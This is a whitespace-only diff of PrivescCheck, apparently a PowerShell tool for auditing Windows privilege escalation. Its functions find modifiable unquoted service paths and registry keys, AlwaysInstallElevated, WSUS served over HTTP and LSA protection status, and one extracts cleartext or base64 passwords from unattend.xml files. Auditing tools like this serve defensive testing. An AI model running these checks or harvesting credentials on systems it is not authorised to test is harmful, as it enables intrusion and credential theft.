     [CmdletBinding()] param(
@@ -1586,9 +1586,9 @@ function Get-ExploitableUnquotedPath {
     $PermissionsAddFile = @("WriteData/AddFile", "DeleteChild", "WriteDAC", "WriteOwner")
     $PermissionsAddFolder = @("AppendData/AddSubdirectory", "DeleteChild", "WriteDAC", "WriteOwner")
 
-    # If the Path doesn't start with a " or a ' 
+    # If the Path doesn't start with a " or a '
     if (-not ($Path.StartsWith("`"") -or $Path.StartsWith("'"))) {
-                
+
         # Extract the binpath from the ImagePath
         $BinPath = $Path.SubString(0, $Path.ToLower().IndexOf(".exe") + 4)
 
@@ -1600,25 +1600,25 @@ function Get-ExploitableUnquotedPath {
             # Write-Verbose "Unquoted path with spaces: $($BinPath)"
 
             $BinPath.split(' ') | Get-ModifiablePath | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')} | Foreach-Object {
-                
+
                 $TempPath = $([System.Environment]::ExpandEnvironmentVariables($BinPath))
-                $TempPath = Split-Path -Path $TempPath -Parent 
-                while ($TempPath) 
+                $TempPath = Split-Path -Path $TempPath -Parent
+                while ($TempPath)
                 {
                     try {
 
-                        $ParentPath = Split-Path -Path $TempPath -Parent 
+                        $ParentPath = Split-Path -Path $TempPath -Parent
                         if ($ParentPath -eq $_.ModifiablePath) {
 
-                            $PermissionsSet = $Null 
+                            $PermissionsSet = $Null
                             if (Test-Path -Path $TempPath -ErrorAction SilentlyContinue) {
                                 # If the current folder exists, can we create files in it?
                                 #"Folder $($TempPath) exists, can we create files in $($ParentPath)???"
                                 $PermissionsSet = $PermissionsAddFile
                             } else {
-                                # The current folder doesn't exist, can we create it? 
+                                # The current folder doesn't exist, can we create it?
                                 #"Folder $($TempPath) doesn't exist, can we create the folder $($ParentPath)???"
-                                $PermissionsSet = $PermissionsAddFolder 
+                                $PermissionsSet = $PermissionsAddFolder
                             }
 
                             ForEach ($Permission in $_.Permissions) {
@@ -1629,13 +1629,13 @@ function Get-ExploitableUnquotedPath {
                                     # break
                                 }
                             }
-                            # We found the path returned by Get-ModifiablePath so we can exit the while loop 
+                            # We found the path returned by Get-ModifiablePath so we can exit the while loop
                             break
                         }
                     } catch {
                         # because Split-Path doesn't handle -ErrorAction SilentlyContinue nicely
-                        # exit safely to avoid an infinite loop 
-                        break 
+                        # exit safely to avoid an infinite loop
+                        break
                     }
                     $TempPath = $ParentPath
                 }
@@ -1648,24 +1648,24 @@ function Get-ModifiableRegistryPath {
     <#
     .SYNOPSIS
 
-    Helper - Checks the permissions of a given registry key and returns the ones that the current 
-    user can modify. It's based on the same technique as the one used by @harmj0y in 
+    Helper - Checks the permissions of a given registry key and returns the ones that the current
+    user can modify. It's based on the same technique as the one used by @harmj0y in
     "Get-ModifiablePath".
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
-    Any registry path that the current user has modification rights on is returned in a custom 
+    Any registry path that the current user has modification rights on is returned in a custom
     object that contains the modifiable path, associated permission set, and the IdentityReference
-    with the specified rights. The SID of the current user and any group he/she are a part of are 
+    with the specified rights. The SID of the current user and any group he/she are a part of are
     used as the comparison set against the parsed path DACLs.
-    
+
     .PARAMETER Path
 
     A registry key path. Required
-    
+
     .EXAMPLE
 
     Get-ModifiableRegistryPath -Path "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\VulnService"
@@ -1679,9 +1679,9 @@ function Get-ModifiableRegistryPath {
     Status            : Running
     UserCanStart      : True
     UserCanRestart    : False
-    
+
     #>
-    
+
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
@@ -1756,7 +1756,7 @@ function Get-ModifiableRegistryPath {
                 }
             }
         }
-    } 
+    }
 }
 
 function Add-ServiceDacl {
@@ -1821,7 +1821,7 @@ function Add-ServiceDacl {
                 [ValidateScript({ $_ -as 'ServiceProcess.ServiceController' })]
                 $Service
             )
-            Add-Type -AssemblyName System.ServiceProcess # ServiceProcess is not loaded by default  
+            Add-Type -AssemblyName System.ServiceProcess # ServiceProcess is not loaded by default
             $GetServiceHandle = [ServiceProcess.ServiceController].GetMethod('GetServiceHandle', [Reflection.BindingFlags] 'Instance, NonPublic')
             $ReadControl = 0x00020000
             $RawHandle = $GetServiceHandle.Invoke($Service, @($ReadControl))
@@ -1856,7 +1856,7 @@ function Add-ServiceDacl {
                         $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
 
                         if ($Result) {
-                            
+
                             $RawSecurityDescriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $BinarySecurityDescriptor, 0
 
                             $Dacl = $RawSecurityDescriptor.DiscretionaryAcl | ForEach-Object {
@@ -1882,24 +1882,24 @@ function Get-UEFIStatus {
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
-    Invokes the "GetFirmwareEnvironmentVariable()" function from the Windows API with dummy 
+    Invokes the "GetFirmwareEnvironmentVariable()" function from the Windows API with dummy
     parameters. Indeed, the queried value doesn't matter, what matters is the last error code,
     which you can get by invoking "GetLastError()". If the return code is ERROR_INVALID_FUNCTION,
     this means that the function is not supported by the BIOS so it's LEGACY. Otherwise, the error
     code will indicate that it cannot find the requested variable, which means that the function is
-    supported by the BIOS so it's UEFI. 
-    
+    supported by the BIOS so it's UEFI.
+
     .EXAMPLE
 
     PS C:\> Get-BiosMode
 
-    Name Status Description      
+    Name Status Description
     ---- ------ -----------
     UEFI   True BIOS mode is UEFI
-    
+
     .NOTES
 
     https://github.com/xcat2/xcat-core/blob/master/xCAT-server/share/xcat/netboot/windows/detectefi.cpp
@@ -1922,11 +1922,11 @@ function Get-UEFIStatus {
         if ($Result -gt 0) {
             if ($FirmwareType -eq 1) {
                 # FirmwareTypeBios = 1
-                $Status = $False 
+                $Status = $False
                 $Description = "BIOS mode is Legacy"
             } elseif ($FirmwareType -eq 2) {
                 # FirmwareTypeUefi = 2
-                $Status = $True 
+                $Status = $True
                 $Description = "BIOS mode is UEFI"
             } else {
                 $Description = "BIOS mode is unknown"
@@ -1938,20 +1938,20 @@ function Get-UEFIStatus {
     # Windows = 7/2008 R2
     } elseif (($OsVersion.Major -eq 6) -and ($OsVersion.Minor -eq 1)) {
 
-        [PrivescCheck.Win32]::GetFirmwareEnvironmentVariable("", "{00000000-0000-0000-0000-000000000000}", [IntPtr]::Zero, 0) | Out-Null 
+        [PrivescCheck.Win32]::GetFirmwareEnvironmentVariable("", "{00000000-0000-0000-0000-000000000000}", [IntPtr]::Zero, 0) | Out-Null
         $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
-    
+
         $ERROR_INVALID_FUNCTION = 1
         if ($LastError -eq $ERROR_INVALID_FUNCTION) {
-            $Status = $False 
+            $Status = $False
             $Description = "BIOS mode is Legacy"
             Write-Verbose ([ComponentModel.Win32Exception] $LastError)
         } else {
-            $Status = $True 
+            $Status = $True
             $Description = "BIOS mode is UEFI"
             Write-Verbose ([ComponentModel.Win32Exception] $LastError)
         }
-        
+
     } else {
         $Description = "Cannot check BIOS mode"
     }
@@ -1966,18 +1966,18 @@ function Get-UEFIStatus {
 function Get-SecureBootStatus {
     <#
     .SYNOPSIS
-    
+
     Helper - Get the status of Secure Boot (enabled/disabled/unsupported)
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
-    In case of a UEFI BIOS, you can check whether 'Secure Boot' is enabled by looking at the 
+    In case of a UEFI BIOS, you can check whether 'Secure Boot' is enabled by looking at the
     'UEFISecureBootEnabled' value of the following registry key: 'HKEY_LOCAL_MACHINE\SYSTEM\Current
-    ControlSet\Control\SecureBoot\State'. 
-    
+    ControlSet\Control\SecureBoot\State'.
+
     .EXAMPLE
 
     PS C:\> Get-SecureBootStatus
@@ -1987,11 +1987,11 @@ function Get-SecureBootStatus {
     Secure Boot   True Secure Boot is enabled
 
     #>
-    
+
     [CmdletBinding()]Param()
 
     $RegPath = "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecureBoot\State"
-    $Result = Get-ItemProperty -Path "Registry::$($RegPath)" -ErrorAction SilentlyContinue -ErrorVariable GetItemPropertyError 
+    $Result = Get-ItemProperty -Path "Registry::$($RegPath)" -ErrorAction SilentlyContinue -ErrorVariable GetItemPropertyError
 
     if (-not $GetItemPropertyError) {
 
@@ -2024,17 +2024,17 @@ function Get-CredentialGuardStatus {
     <#
     .SYNOPSIS
 
-    Helper - Gets the status of Windows Defender Credential Guard 
+    Helper - Gets the status of Windows Defender Credential Guard
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
-    Gets the status of the Credential Guard by reading the 'LsaCfgFlags' value of the following 
+    Gets the status of the Credential Guard by reading the 'LsaCfgFlags' value of the following
     registry key: 'HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\LSA'. Possible values are:
     None=>Not configured, 0=>Disabled, 1=>Enabled with UEFI lock, 2=>Disabled without UEFI lock.
-    
+
     .EXAMPLE
 
     PS C:\> Get-CredentialGuardStatus
@@ -2042,19 +2042,19 @@ function Get-CredentialGuardStatus {
     Name             Status Description
     ----             ------ -----------
     Credential Guard  False Credential Guard is not configured
-    
+
     .LINK
 
     https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-manage
 
     #>
-    
+
     [CmdletBinding()]Param()
 
     $OsVersion = [System.Environment]::OSVersion.Version
 
     if ($OsVersion.Major -ge 10) {
-        
+
         if (((Get-ComputerInfo).DeviceGuardSecurityServicesConfigured) -match 'CredentialGuard') {
 
             $Status = $False
@@ -2088,26 +2088,26 @@ function Get-LsaRunAsPPLStatus {
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
     RunAsPPL can be enabled for the LSA process in the registry. If it's enabled and the device has
-    Secure Boot or UEFI, this setting is stored in the UEFI firmware so removing the registry key 
-    won't disable this setting. 
-    
+    Secure Boot or UEFI, this setting is stored in the UEFI firmware so removing the registry key
+    won't disable this setting.
+
     .EXAMPLE
 
     PS C:\> Get-LsaRunAsPPLStatus
-    
-    Name     Status Description        
+
+    Name     Status Description
     ----     ------ -----------
     RunAsPPL   True RunAsPPL is enabled
-    
+
     .LINK
 
     https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection
     #>
-    
+
 
     [CmdletBinding()]Param()
 
@@ -2124,21 +2124,21 @@ function Get-LsaRunAsPPLStatus {
             if (-not ($Null -eq $Result.RunAsPPL)) {
 
                 if ($Result.RunAsPPL -eq 1) {
-                    $Status = $True 
+                    $Status = $True
                     $Description = "RunAsPPL is enabled"
                 } else {
-                    $Status = $False 
+                    $Status = $False
                     $Description = "RunAsPPL is disabled"
-                } 
+                }
             } else {
-                $Status = $False 
+                $Status = $False
                 $Description = "RunAsPPL is not configured"
             }
         }
 
     } else {
-        # RunAsPPL not supported 
-        $Status = $False 
+        # RunAsPPL not supported
+        $Status = $False
         $Description = "RunAsPPL is not supported on this OS"
     }
 
@@ -2158,7 +2158,7 @@ function Get-UnattendSensitiveData {
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
     Unattend files are XML documents which may contain cleartext passwords if they are not
@@ -2166,12 +2166,12 @@ function Get-UnattendSensitiveData {
     "*SENSITIVE*DATA*DELETED*" mention but sometimes, the original value remains and is either
     present in its plaintext form or base64-encoded form. If a non-empty password field is found
     and if it's not equal to the default "*SENSITIVE*DATA*DELETED*", this function will return the
-    corresponding set of credentials: domain, username and (decoded) password. 
-    
+    corresponding set of credentials: domain, username and (decoded) password.
+
     .PARAMETER Path
 
     The Path of the "unattend.xml" file to parse
-    
+
     .EXAMPLE
 
     PS C:\> Get-UnattendSensitiveData -Path C:\Windows\Panther\Unattend.xml
@@ -2181,8 +2181,8 @@ function Get-UnattendSensitiveData {
     Credentials  contoso.com Administrator Password1
     LocalAccount N/A         John          Password1
     AutoLogon    .           Administrator P@ssw0rd
-    
-    .NOTES 
+
+    .NOTES
 
     A password can be stored in three formats:
 
@@ -2191,7 +2191,7 @@ function Get-UnattendSensitiveData {
         <Password>Password</Password>
 
     2) XML node + plain value
-    
+
         <Password>
             <Value>Password</Value>
             <PlainText>true</PlainText>
@@ -2202,7 +2202,7 @@ function Get-UnattendSensitiveData {
         <Password>
             <Value>UABhAHMAcwB3AG8AcgBkAA==</Value>
             <PlainText>false</PlainText>
-        </Password> 
+        </Password>
 
     /!\ UNICODE encoding!
 
@@ -2249,11 +2249,11 @@ function Get-UnattendSensitiveData {
                 $Item
             }
         }
-    
+
         $Xml.GetElementsByTagName("LocalAccount") | ForEach-Object {
 
             $Password = Get-DecodedPassword -XmlNode $_.Password
-    
+
             if ($Password -and ( -not ($Password -eq "*SENSITIVE*DATA*DELETED*"))) {
                 $Item = New-Object -TypeName PSObject
                 $Item | Add-Member -MemberType "NoteProperty" -Name "Type" -Value "LocalAccount"
@@ -2263,7 +2263,7 @@ function Get-UnattendSensitiveData {
                 $Item
             }
         }
-    
+
         $Xml.GetElementsByTagName("AutoLogon") | ForEach-Object {
 
             $Password = Get-DecodedPassword -XmlNode $_.Password
@@ -2299,18 +2299,18 @@ function Get-HotFixList {
     .SYNOPSIS
 
     Helper - Gets a list of installed updates and hotfixes.
-    
+
     .DESCRIPTION
 
     This check reads the registry in order to enumerate all the installed KB hotfixes. The output
     is sorted by date so that most recent patches appear first in the list. The output is similar
     to the output of the built-in 'Get-HotFix' powershell command. There is a major difference
     between this script and the 'Get-HotFix' command though. The latter relies on WMI to delegate
-    the "enumeration" whereas this script directly parses the registry. The other benefit of this 
+    the "enumeration" whereas this script directly parses the registry. The other benefit of this
     method is that it allows one to extract more information related to the KBs (although it's not
     in the output of this script). If the current user can't read the registry, the script falls
     back to the built-in 'Get-HotFix' cmdlet.
-    
+
     .EXAMPLE
 
     PS C:\> Get-HotFixList
@@ -2361,7 +2361,7 @@ function Get-HotFixList {
     if ($CachedHotFixList.Count -eq 0) {
 
         # In the registry, one KB may have multiple entries because it can be split up into multiple
-        # packages. This array will help keep track of KBs that have already been checked by the 
+        # packages. This array will help keep track of KBs that have already been checked by the
         # script.
         $InstalledKBs = New-Object -TypeName System.Collections.ArrayList
 
@@ -2370,39 +2370,39 @@ function Get-HotFixList {
         if (-not $ErrorGetChildItem) {
 
             $AllPackages | ForEach-Object {
-        
+
                 # Filter only KB-related packages
                 if (($_.Name | Split-Path -Leaf) -Like "Package_*_for_KB*") {
-            
+
                     $PackageProperties = $_ | Get-ItemProperty
-        
+
                     # Get the KB id, e.g.: KBXXXXXXX
                     $PackageName = $PackageProperties.InstallName.Split('~')[0].Split('_') | Where-Object { $_ -Like "KB*" }
                     if ($PackageName) {
-        
+
                         # Check whether this KB has already been handled
                         if (-not ($InstalledKBs -contains $PackageName)) {
-        
+
                             # Add the KB id to the list so we don't check it multiple times
                             [void]$InstalledKBs.Add($PackageName)
-        
+
                             # Who installed this update?
                             $InstalledBy = Convert-SidToName -Sid $PackageProperties.InstallUser
-                            
+
                             # Get the install date. It's stored in the registry just like a FILETIME structure.
-                            # So, we have to combine the low part and the high part and convert the result 
+                            # So, we have to combine the low part and the high part and convert the result
                             # to a DateTime object.
                             $DateHigh = $PackageProperties.InstallTimeHigh
                             $DateLow = $PackageProperties.InstallTimeLow
                             $FileTime = $DateHigh * [Math]::Pow(2, 32) + $DateLow
                             $InstallDate = [DateTime]::FromFileTime($FileTime)
-        
+
                             # Parse the package metadata file and extract some useful information...
                             $ServicingPackagesPath = Join-Path -Path $env:windir -ChildPath "servicing\Packages"
                             $PackagePath = Join-Path -Path $ServicingPackagesPath -ChildPath $PackageProperties.InstallName
                             $PackageInfo = Get-PackageInfo -Path $PackagePath
-        
-                            $Entry = New-Object -TypeName PSObject 
+
+                            $Entry = New-Object -TypeName PSObject
                             $Entry | Add-Member -MemberType "NoteProperty" -Name "HotFixID" -Value "$PackageName"
                             $Entry | Add-Member -MemberType "NoteProperty" -Name "Description" -Value "$($PackageInfo.ReleaseType)"
                             $Entry | Add-Member -MemberType "NoteProperty" -Name "InstalledBy" -Value "$InstalledBy"
@@ -2429,12 +2429,12 @@ function Get-HotFixList {
 function Get-SccmCacheFolder {
     <#
     .SYNOPSIS
-    
+
     Helper - Get the SCCM cache folder as a PowerShell object if it exists.
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     #>
 
     [CmdletBinding()] param ()
@@ -2446,21 +2446,21 @@ function Get-SccmCacheFolder {
 function Get-ScheduledTaskList {
     <#
     .SYNOPSIS
-    
+
     Helper - Enumerate all the scheduled task that are not disabled and that are visible to the current user.
-    
+
     Author: @itm4n
     License: BSD 3-Clause
 
     .DESCRIPTION
 
-    Connect to the task scheduler service and retrieve a list of all the scheduled tasks that are 
+    Connect to the task scheduler service and retrieve a list of all the scheduled tasks that are
     visible to the current user.
-    
+
     .EXAMPLE
 
     An example
-    
+
     #>
 
     function Get-ScheduledTasks {
@@ -2484,35 +2484,35 @@ function Get-ScheduledTaskList {
 
             $ScheduleService = New-Object -ComObject("Schedule.Service")
             $ScheduleService.Connect()
-    
+
             Get-ScheduledTasks -Service $ScheduleService -TaskPath "\" | ForEach-Object {
-    
+
                 if ($_.Enabled) {
-    
+
                     $TaskName = $_.Name
                     $TaskPath = $_.Path
                     $TaskFile = Join-Path -Path $(Join-Path -Path $env:windir -ChildPath "System32\Tasks") -ChildPath $TaskPath
-    
+
                     [xml]$TaskXml = $_.Xml
                     $TaskExec = $TaskXml.GetElementsByTagName("Exec")
                     $TaskCommandLine = "$($TaskExec.Command) $($TaskExec.Arguments)"
                     $Principal = $TaskXml.GetElementsByTagName("Principal")
-                    
+
                     $CurrentUserIsOwner = $False
-    
+
                     if ($Principal.UserId) {
                         $PrincipalName = Convert-SidToName -Sid $Principal.UserId
-                        
+
                         if ($(Invoke-UserCheck).SID -eq $Principal.UserId) {
                             $CurrentUserIsOwner = $True
                         }
                     } elseif ($Principal.GroupId) {
                         $PrincipalName = Convert-SidToName -Sid $Principal.GroupId
                     }
-    
+
                     if ($TaskExec.Command.Length -gt 0) {
-    
-                        $ResultItem = New-Object -TypeName PSObject 
+
+                        $ResultItem = New-Object -TypeName PSObject
                         $ResultItem | Add-Member -MemberType "NoteProperty" -Name "TaskName" -Value $TaskName
                         $ResultItem | Add-Member -MemberType "NoteProperty" -Name "TaskPath" -Value $TaskPath
                         $ResultItem | Add-Member -MemberType "NoteProperty" -Name "TaskFile" -Value $TaskFile
@@ -2520,7 +2520,7 @@ function Get-ScheduledTaskList {
                         $ResultItem | Add-Member -MemberType "NoteProperty" -Name "Command" -Value $TaskCommandLine
                         $ResultItem | Add-Member -MemberType "NoteProperty" -Name "CurrentUserIsOwner" -Value $CurrentUserIsOwner
                         [void] $CachedScheduledTaskList.Add($ResultItem)
-    
+
                     } else {
                         Write-Verbose "Task '$($_.Name)' has an empty cmd line"
                     }
@@ -2530,7 +2530,7 @@ function Get-ScheduledTaskList {
             }
         }
 
-        $CachedScheduledTaskList | ForEach-Object { 
+        $CachedScheduledTaskList | ForEach-Object {
             $_
         }
 
@@ -2538,16 +2538,16 @@ function Get-ScheduledTaskList {
         Write-Verbose $_
     }
 }
-#endregion Helpers 
+#endregion Helpers
 
 
 # ----------------------------------------------------------------
-# Checks  
+# Checks
 # ----------------------------------------------------------------
-#region Checks 
+#region Checks
 
 # ----------------------------------------------------------------
-# BEGIN CONFIG   
+# BEGIN CONFIG
 # ----------------------------------------------------------------
 function Invoke-UacCheck {
     <#
@@ -2557,15 +2557,15 @@ function Invoke-UacCheck {
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
     The state of UAC can be determined based on the value of the parameter "EnableLUA" in the
     following registry key:
     HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
     0 = Disabled
-    1 = Enabled 
-    
+    1 = Enabled
+
     .EXAMPLE
 
     PS C:\> Invoke-UacCheck | fl
@@ -2573,7 +2573,7 @@ function Invoke-UacCheck {
     Path      : Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
     EnableLUA : 1
     Enabled   : True
-    
+
     .NOTES
 
     "UAC was formerly known as Limited User Account (LUA)."
@@ -2582,7 +2582,7 @@ function Invoke-UacCheck {
 
     https://docs.microsoft.com/en-us/windows-hardware/customize/desktop/unattend/microsoft-windows-lua-settings-enablelua
     #>
-    
+
     [CmdletBinding()]Param()
 
     $RegPath = "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System"
@@ -2607,21 +2607,21 @@ function Invoke-LapsCheck {
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
     The status of LAPS can be check using the following registry key.
     HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft Services\AdmPwd
 
     #>
-    
+
     [CmdletBinding()]Param()
-    
+
     $RegPath = "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft Services\AdmPwd"
 
-    $Item = Get-ItemProperty -Path "Registry::$RegPath" -ErrorAction SilentlyContinue -ErrorVariable GetItemPropertyError 
+    $Item = Get-ItemProperty -Path "Registry::$RegPath" -ErrorAction SilentlyContinue -ErrorVariable GetItemPropertyError
     if (-not $GetItemPropertyError) {
-        $LapsResult = New-Object -TypeName PSObject 
+        $LapsResult = New-Object -TypeName PSObject
         $LapsResult | Add-Member -MemberType "NoteProperty" -Name "Path" -Value $RegPath
         $LapsResult | Add-Member -MemberType "NoteProperty" -Name "AdmPwdEnabled" -Value $Item.AdmPwdEnabled
         $LapsResult | Add-Member -MemberType "NoteProperty" -Name "Enabled" -Value $($Item.AdmPwdEnabled -eq 1)
@@ -2637,13 +2637,13 @@ function Invoke-PowershellTranscriptionCheck {
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
-    Powershell Transcription is used to log PowerShell scripts execution. It can be configured 
+    Powershell Transcription is used to log PowerShell scripts execution. It can be configured
     thanks to the Group Policy Editor. The settings are stored in the following registry key:
     HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription
-    
+
     .EXAMPLE
 
     PS C:\> Invoke-PowershellTranscriptionCheck | fl
@@ -2651,7 +2651,7 @@ function Invoke-PowershellTranscriptionCheck {
     EnableTranscripting    : 1
     EnableInvocationHeader : 1
     OutputDirectory        : C:\Transcripts
-    
+
     .NOTES
 
     If PowerShell Transcription is configured, the settings can be found here:
@@ -2662,43 +2662,43 @@ function Invoke-PowershellTranscriptionCheck {
         EnableTranscripting    REG_DWORD    0x1
         OutputDirectory    REG_SZ    C:\Transcripts
         EnableInvocationHeader    REG_DWORD    0x1
-    
+
     To enable PowerShell Transcription:
     Group Policy Editor > Administrative Templates > Windows Components > Windows PowerShell > PowerShell Transcription
     Set an output directory and set the policy as Enabled
 
     #>
-    
+
     [CmdletBinding()]Param()
 
     $RegPath = "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription"
 
-    $Item = Get-ItemProperty -Path "Registry::$RegPath" -ErrorAction SilentlyContinue -ErrorVariable GetItemPropertyError 
+    $Item = Get-ItemProperty -Path "Registry::$RegPath" -ErrorAction SilentlyContinue -ErrorVariable GetItemPropertyError
     if (-not $GetItemPropertyError) {
-        # PowerShell Transcription is configured 
-        $PowershellTranscriptionResult = New-Object -TypeName PSObject 
+        # PowerShell Transcription is configured
+        $PowershellTranscriptionResult = New-Object -TypeName PSObject
         $PowershellTranscriptionResult | Add-Member -MemberType "NoteProperty" -Name "EnableTranscripting" -Value $Item.EnableTranscripting
         $PowershellTranscriptionResult | Add-Member -MemberType "NoteProperty" -Name "EnableInvocationHeader" -Value $Item.EnableInvocationHeader
         $PowershellTranscriptionResult | Add-Member -MemberType "NoteProperty" -Name "OutputDirectory" -Value $Item.OutputDirectory
         $PowershellTranscriptionResult
-    } 
+    }
 }
 
 function Invoke-BitlockerCheck {
     <#
     .SYNOPSIS
-    
+
     Checks whether BitLocker is enabled (workstations only).
-    
+
     .DESCRIPTION
 
-    When BitLocker is enabled on the system drive, the value "BootStatus" is set to 1 in the 
+    When BitLocker is enabled on the system drive, the value "BootStatus" is set to 1 in the
     following registry key: 'HKLM\SYSTEM\CurrentControlSet\Control\BitLockerStatus'.
-    
+
     .EXAMPLE
 
     An example
-    
+
     #>
 
     [CmdletBinding()]Param()
@@ -2709,12 +2709,12 @@ function Invoke-BitlockerCheck {
 
         $RegPath = "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\BitLockerStatus"
 
-        $Item = Get-ItemProperty -Path "Registry::$RegPath" -ErrorAction SilentlyContinue -ErrorVariable GetItemPropertyError 
+        $Item = Get-ItemProperty -Path "Registry::$RegPath" -ErrorAction SilentlyContinue -ErrorVariable GetItemPropertyError
         if (-not $GetItemPropertyError) {
 
             if (-not ($Item.BootStatus -eq 1)) {
 
-                $BitlockerResult = New-Object -TypeName PSObject 
+                $BitlockerResult = New-Object -TypeName PSObject
                 $BitlockerResult | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $RegPath
                 $BitlockerResult | Add-Member -MemberType "NoteProperty" -Name "BootStatus" -Value $Item.BootStatus
                 $BitlockerResult | Add-Member -MemberType "NoteProperty" -Name "Description" -Value "BitLocker isn't enabled."
@@ -2723,7 +2723,7 @@ function Invoke-BitlockerCheck {
 
         } else {
 
-            $BitlockerResult = New-Object -TypeName PSObject 
+            $BitlockerResult = New-Object -TypeName PSObject
             $BitlockerResult | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $RegPath
             $BitlockerResult | Add-Member -MemberType "NoteProperty" -Name "BootStatus" -Value ""
             $BitlockerResult | Add-Member -MemberType "NoteProperty" -Name "Description" -Value "BitLocker isn't configured."
@@ -2740,16 +2740,16 @@ function Invoke-RegistryAlwaysInstallElevatedCheck {
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
-    AlwaysInstallElevated can be configured in both HKLM and HKCU. "If the AlwaysInstallElevated 
+    AlwaysInstallElevated can be configured in both HKLM and HKCU. "If the AlwaysInstallElevated
     value is not set to "1" under both of the preceding registry keys, the installer uses elevated
-    privileges to install managed applications and uses the current user's privilege level for 
+    privileges to install managed applications and uses the current user's privilege level for
     unmanaged applications."
-    
+
     #>
-    
+
     [CmdletBinding()]Param()
 
     $Result = New-Object -TypeName System.Collections.ArrayList
@@ -2760,9 +2760,9 @@ function Invoke-RegistryAlwaysInstallElevatedCheck {
 
         $HKLMval = Get-ItemProperty -Path "Registry::$RegPath" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
         if ($HKLMval.AlwaysInstallElevated -and ($HKLMval.AlwaysInstallElevated -ne 0)){
-            $Item = New-Object -TypeName PSObject 
+            $Item = New-Object -TypeName PSObject
             $Item | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $RegPath
-            $Item | Add-Member -MemberType "NoteProperty" -Name "AlwaysInstallElevated" -Value $HKLMval.AlwaysInstallElevated 
+            $Item | Add-Member -MemberType "NoteProperty" -Name "AlwaysInstallElevated" -Value $HKLMval.AlwaysInstallElevated
             $Item | Add-Member -MemberType "NoteProperty" -Name "Enabled" -Value $True
             [void]$Result.Add($Item)
         }
@@ -2775,13 +2775,13 @@ function Invoke-RegistryAlwaysInstallElevatedCheck {
             if ($HKCUval.AlwaysInstallElevated -and ($HKCUval.AlwaysInstallElevated -ne 0)){
                 $Item = New-Object -TypeName PSObject
                 $Item | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $RegPath
-                $Item | Add-Member -MemberType "NoteProperty" -Name "AlwaysInstallElevated" -Value $HKLMval.AlwaysInstallElevated 
+                $Item | Add-Member -MemberType "NoteProperty" -Name "AlwaysInstallElevated" -Value $HKLMval.AlwaysInstallElevated
                 $Item | Add-Member -MemberType "NoteProperty" -Name "Enabled" -Value $True
                 [void]$Result.Add($Item)
 
                 $Result
             }
-        } 
+        }
     }
 }
 
@@ -2789,17 +2789,17 @@ function Invoke-LsaProtectionsCheck {
     <#
     .SYNOPSIS
 
-    Checks whether LSASS is configured to run as a Protected Process 
+    Checks whether LSASS is configured to run as a Protected Process
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
     First it reads the registry to check whether "RunAsPPL" is configured and enabled in the
     "LSA" key. It also checks whether additional protections such as Secure Boot or Credential
-    Guard are configured / enabled. 
-    
+    Guard are configured / enabled.
+
     .EXAMPLE
 
     On Windows 10:
@@ -2812,7 +2812,7 @@ function Invoke-LsaProtectionsCheck {
     UEFI               True BIOS mode is UEFI
     Secure Boot        True Secure Boot is enabled
     Credential Guard  False Credential Guard is not configured
-    
+
     .EXAMPLE
 
     On Windows Server 2012 R2:
@@ -2827,7 +2827,7 @@ function Invoke-LsaProtectionsCheck {
     Credential Guard  False Credential Guard is not supported on this OS
 
     #>
-    
+
     [CmdletBinding()]Param()
 
     Get-LsaRunAsPPLStatus
@@ -2840,25 +2840,25 @@ function Invoke-LsaProtectionsCheck {
 function Invoke-WsusConfigCheck {
     <#
     .SYNOPSIS
-    
+
     Checks whether the WSUS is enabled and vulnerable (Wsuxploit)
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
-    
+
     A system can be compromised if the updates are not requested using HTTPS but HTTP. If the URL
-    of the update server (WUServer) starts with HTTP and UseWUServer=1, then the update requests 
+    of the update server (WUServer) starts with HTTP and UseWUServer=1, then the update requests
     are vulnerable to MITM attacks.
-    
+
     .EXAMPLE
-    
+
     PS C:\> Invoke-WsusConfigCheck
 
     WUServer     : http://acme-upd01.corp.internal.com:8535
     UseWUServer  : 1
-    
+
     .LINK
 
